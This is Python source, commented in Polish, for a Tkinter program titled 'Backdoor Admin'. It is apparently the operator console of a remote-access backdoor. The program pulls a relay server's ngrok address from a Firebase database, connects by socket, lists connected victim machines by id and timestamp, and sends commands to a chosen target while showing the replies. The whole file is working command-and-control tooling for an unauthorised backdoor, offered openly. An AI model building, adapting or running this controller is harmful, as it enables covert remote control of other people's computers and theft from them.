# Potrzebne biblioteki
import socket
import threading
import sys
import socket
import subprocess
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
import uuid
import datetime
import json
import win32gui
import win32con
from tkinter import *
import firebase_admin
from firebase_admin import credentials
import time
from firebase import firebase
import sys
from pprint import pprint
# Klucze biblioteki google firebase
cred = credentials.Certificate(
    {
#your certificate
    }
)
firebase_admin.initialize_app(cred, {
#your firebase addres
})


# Tworzenie okana i ustawianie parametrów
okno = Tk()
okno.title("Backdoor Admin")
okno.configure(bg="black")
okno.geometry('1000x1000')

# Tworzenie elemtów przyszłego ui
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tabela = Frame(okno, relief=SUNKEN, bd=5, bg="gray")
label_out_var = ""
label_out = Label(okno, text="", bg="gray",
                  textvariable=label_out_var, wraplengt=200,font=("Arial", 25))
tabela1 = Frame(okno, relief=SUNKEN, bd=5, bg="gray")
tabela1.pack()

# Tworzenie zmiennych pobierających dane z wejść tektowych
adresattk = StringVar()
messagetk = StringVar()
hosttk = StringVar()
porttk = StringVar()


# Zmienna int o nazwie idss przechowująca identyfikator komunikacji
idss = 0
# Zmienna int definiująca czy start jest manualny czy automatyczny
manu = 0
# zmienna przechowująca port serwera
portor = 0
# zmienna przechowująca ip serwera
ip = ""
# funkcja startu autmatycznego


def auto():
    # definiowanie startu jako automatyczny
    global manu
    manu = 0
    # usuwanie starych elementów ui
    auto_btt.destroy()
    manu_btt.destroy()
    # ustawanie ścieżki do informacji o porcie serwera w bazie firebase
    ref = db.reference("ngrok/ip/")
    # pobieranie danych z bazy
    data = ref.get()
    # ustawianie ip jako pobrany z bazy
    global ip
    ip = data
    # ustawanie ścieżki do informacji o porcie serwera w bazie firebase
    ref = db.reference("ngrok/port/")
    # pobieranie danych z bazy
    data = ref.get()
    # ustawianie portu jako pobrany z bazy
    global portor
    portor = data
    # uruchamianie funkcji usuwającej stare ui i dodającej nowe
    usun_tekst()
# funkcja startu manulanego


def manual():
    # definiowanie startu jako manualny
    global manu
    manu = 1
    # usuwanie starych elementów ui
    auto_btt.destroy()
    manu_btt.destroy()
    # tworzenie nowych elemntów ui
    tekst1 = Entry(tabela1, bg="gray", font=('', 20), textvariable=hosttk) .grid(
        row=0, column=1, padx=10, pady=10, ipadx=10, ipady=10)
    tekst2 = Entry(tabela1, bg="gray", font=('', 20), textvariable=porttk).grid(
        row=1, column=1, padx=10, pady=10, ipadx=10, ipady=10)

    lab1 = Label(tabela1, text="Host").grid(
        row=0, column=0, padx=10, pady=10, ipadx=10, ipady=10)
    lab2 = Label(tabela1, text="Port").grid(
        row=1, column=0, padx=10, pady=10, ipadx=10, ipady=10)
    global tabela2
    tabela2 = Frame(okno, relief=SUNKEN, bd=5, bg="gray")
    tabela2.pack()

    # tworzenie przycisku z funkcją po wciśnięciu o nazwie "usun_tekst" usuwającej stare ui i dodającej nowe
    nowy_przycisk = Button(tabela2, text="Connect", bg="red", font=(
        '', 20), command=usun_tekst).grid(row=0, column=0, padx=10, pady=10, ipadx=10, ipady=10)


# tworzenie ui wyboru trybu uruchomienia manualny czy automatyczny
auto_btt = Button(tabela1, text="Auto", bg="red", font=('', 20), command=auto)
manu_btt = Button(tabela1, text="Manual", bg="red",
                  font=('', 20), command=manual)
auto_btt.pack()
manu_btt.pack()

# funkcja zamykająca program


def exit():
    sys.exit(0)

# funkcja odbierania danych


def receive(socket, signal):
    while signal:
        # przyjmowanie pakietów danych
        data = socket.recv(32)
        # przerwa na przetworzenie
        time.sleep(5)
        # dekodowanie danych
        dt = data.decode("utf-8")
        dts = dt.split(',')
        # sprawdzanie czy dane przydzelają identyfikator
        if dts[0] == "///":
            # ustawaniae identyfiaktora jako pobrany
            global idss
            idss = dts[1]
            # wyświatlanie identyfikaotra w konsoli
            print(idss)
            # odświrzanie tablei połączeń
            odnow_tabele()

        else:
            # dzelenie danych na części
            dts2 = dt.split('~')
            # wyświtalnie danych
            print(str(data.decode("utf-8")))
            # dodawanie danych do zmiennej "dodatek"
            dodatek = "\n" + dts2[0] + ": " + dts2[1]
            # dodawanie danych zwrotych do danych odebranych wyświetlanych w menu
            global label_out_var
            label_out_var = label_out_var+dodatek
            label_out.config(text=label_out_var)


# funkcja wysłania danych
def send():
    # pobieranie danych wejściowych od urzytkownika
    adresat = adresattk.get()
    message = messagetk.get()
    # opbieranie własnego id
    global idss
    # wysyłanie wiadomości
    sock.sendall(str.encode(str(idss)+"~"+str(adresat)+"~"+message))
# funkcja odświerzania tabeli połączeń


def odnow_tabele():
    # ustawianie ścieżki do danych o połączeniach
    ref = db.reference("ngrok/users")
    # pobieranie danych
    users = str(ref.get())
    # wyświetlanie połączeń
    print("users: "+users)
    # ustawianie ścieżki do danych o połączeniach
    ref = db.reference("ngrok/users/")
    # pobieranie danych
    data = ref.get()
    # tworzenie list id i danych połaczeń
    id_list = []
    dt_list = []
    # tworzenie zmiennej wewnętrznej
    F = 0
    # pętla dzieląca pozyskanie informacje na id i data
    for key, value in data.items():
        F = 1+F
        ID_VAL = value['id']
        id_list.append(ID_VAL)
        DT_VAL = value['dt']
        dt_list.append(DT_VAL)
    z = 0
    xyz = ""
    # pętla dodająca linijki do dabeli
    for i in id_list:
        # dzielneie danych
        ii = i.split("(")
        # pobieranie własnego id
        global idss
        xd = idss
        # wyświtlanie własnego id i id połaczenia dodającego do linijki
        print(ii[0]+"   "+str(xd))
        # sprawdzanie czy to nasze połaczenie jeśli tak to dodawany jest dopisek (self)
        if ii[0] == str(xd):
            # dodwanie linijki do wyjścia
            xyz = xyz+i+".  "+dt_list[z]+" (self)"+"\n"
            # wyświtlanie w konsoli czy to twoje połączenie
            print("to ja")
        else:
            # dodwanie linijki do wyjścia
            xyz = xyz+i+".  "+dt_list[z]+"\n"
            # wyświtlanie w konsoli czy to twoje połączenie
            print("to nie ja")
            
        # dodawanie 1 do zmeinnej z
        z = z+1
    # wyświtlanie tabeli z tekstem zapisanym w zmeinnej xyz
    Label(tabela, text=xyz, font=('', 20)).grid(
        row=0, column=0, padx=10, pady=10, ipadx=10, ipady=10)
# funkcja informująca użytkwoania o nie udanym połączniu


def zepsute():
    # pobieranie zmiennej tabla3
    global tabela3
    # tworzaenie tabeli
    tabela3 = Frame(okno, relief=SUNKEN, bd=5, bg="gray")
    tabela3.pack()
    # dodawanie informacji o błędzie do tabeli
    Label(tabela3, text="Connection refused").grid(
        row=0, column=0, padx=10, pady=10, ipadx=10, ipady=10)
    Button(tabela3, text="Exit", bg="red", font=('', 20), command=exit).grid(
        row=1, column=0, padx=10, pady=10, ipadx=10, ipady=10)

# funkcja łącząca się z serwerem manualnie lub automatycznie i tworzące nwe menu


def usun_tekst():
    # sprawdzani czy połącznie było automatyczne tak - 1 nie - 0
    if manu == 1:
        # wersja manualna
        # tworznie zmiennych host i port
        host = ""
        port = 0

        # próba pobrania danych host i port od urzytkownika
        try:
            host = hosttk.get()
            port = int(porttk.get())
        except:
            # wyświtalnie w konsoli powodu nie udanego połączenia
            print("nie podano hosta lub portu")
    else:
        # pwersja automatyczna
        # ustalnie zmiennej ip i port
        host = ip
        port = int(portor)
        # wyświtalnie ich
        print("host " + host+" port "+str(port))
    # sprawdzanie czy port lub host nie są puste
    if port != 0 and host != "":
        # usuwanie starego ui
        try:
            tabela1.destroy()
            tabela2.destroy()
        except:
            print("było auto")

        # próba połącznia
        try:

            sock.connect((host, port))
            f = 1

        # informowanie użytkownika o nie udanym połączniu
        except:
            zepsute()
            f = 0
        # jeżeli udane to przejdź dalej
        if f == 1:
            # tworznie nowego ui
            nowy_tekst1 = Entry(okno, font=('', 20), textvariable=adresattk)
            nowy_tekst2 = Entry(okno, font=('', 20), textvariable=messagetk)
            nowy_tekst1.pack(padx=10, pady=20)
            nowy_tekst2.pack(padx=10, pady=20)

            nowy_przycisk = Button(
                okno, text="Send", bg="red", font=('', 20), command=send)
            nowy_przycisk.pack(padx=10, pady=20)
            receiveThread = threading.Thread(target=receive, args=(sock, True))
            receiveThread.start()

            tabela.pack()
            # próba odnowienia tabeli, nie udane jeżeli program nie ma danych w bazie
            try:
                odnow_tabele()
            except:
                print("był start")
            # wyświtlanie ui użytkownikowi
            label_out.pack()
    # informowanie użytkownikia że nie podał portu lub hosta
    else:
        info = Label(tabela2, text="host or port is incorrect", bg="red").grid(
            row=1, column=0, padx=10, pady=10, ipadx=10, ipady=10)


# pętla główna uniemożliwiająca autoamtyczne zamknięcie okna
okno.mainloop()
